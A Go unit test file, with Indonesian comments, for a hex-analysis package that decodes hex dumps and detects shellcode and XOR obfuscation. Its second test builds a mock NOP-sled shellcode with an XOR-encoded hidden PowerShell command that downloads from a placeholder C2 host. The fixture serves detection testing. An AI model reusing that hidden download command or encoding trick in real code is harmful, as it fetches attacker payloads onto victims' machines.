package hexanalyzer

import (
	"encoding/hex"
	"testing"
)

func TestNormalizeAndDecodeHex(t *testing.T) {
	// 1. Format raw kontinu
	raw := "4d5a90000300"
	decoded, err := NormalizeAndDecodeHex(raw)
	if err != nil || len(decoded) != 6 {
		t.Fatalf("Failed to decode raw hex: %v", err)
	}

	// 2. Format C-array (\x4d\x5a\x90)
	cArray := "\\x4d\\x5a\\x90\\x00"
	decodedC, err := NormalizeAndDecodeHex(cArray)
	if err != nil || len(decodedC) != 4 {
		t.Fatalf("Failed to decode C-array hex: %v", err)
	}

	// 3. Format 0x dengan koma dan spasi
	hexList := "0x4D, 0x5A, 0x90, 0x00, 0x03"
	decodedList, err := NormalizeAndDecodeHex(hexList)
	if err != nil || len(decodedList) != 5 {
		t.Fatalf("Failed to decode 0x list: %v", err)
	}

	// 4. Format canonical hexdump dengan offset
	dump := "00000000: 4d 5a 90 00 03 00 00 00  |MZ......|\n00000008: 04 00 00 00 ff ff 00 00  |........|"
	decodedDump, err := NormalizeAndDecodeHex(dump)
	if err != nil || len(decodedDump) != 16 {
		t.Fatalf("Failed to decode canonical hexdump: %v", err)
	}
}

func TestShellcodeAndXORAnalysis(t *testing.T) {
	// Buat shellcode mock dengan NOP sled (12x 0x90) + Call $+5 (E8 00 00 00 00) + Pop EAX (58)
	var shellcode []byte
	shellcode = append(shellcode, []byte{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90}...)
	shellcode = append(shellcode, []byte{0xE8, 0x00, 0x00, 0x00, 0x00, 0x58}...)

	// Tambahkan string yang di-XOR dengan key 0x5A
	key := byte(0x5A)
	plain := "powershell.exe -w hidden http://c2-server.com/b.bin"
	xorBytes := make([]byte, len(plain))
	for i := 0; i < len(plain); i++ {
		xorBytes[i] = plain[i] ^ key
	}
	shellcode = append(shellcode, xorBytes...)

	hexString := hex.EncodeToString(shellcode)
	report, err := AnalyzeHexData("mock_shellcode", hexString)
	if err != nil {
		t.Fatalf("AnalyzeHexData returned error: %v", err)
	}

	if len(report.ShellcodeFindings) == 0 {
		t.Errorf("Expected shellcode patterns to be detected")
	}

	if len(report.XORDeobfuscation) == 0 {
		t.Errorf("Expected XOR deobfuscation to succeed for key 0x5A")
	}

	foundTarget := false
	for _, cand := range report.XORDeobfuscation {
		if cand.KeyByte == 0x5A {
			foundTarget = true
			break
		}
	}
	if !foundTarget {
		t.Errorf("Expected XOR deobfuscation to identify key 0x5A")
	}
}
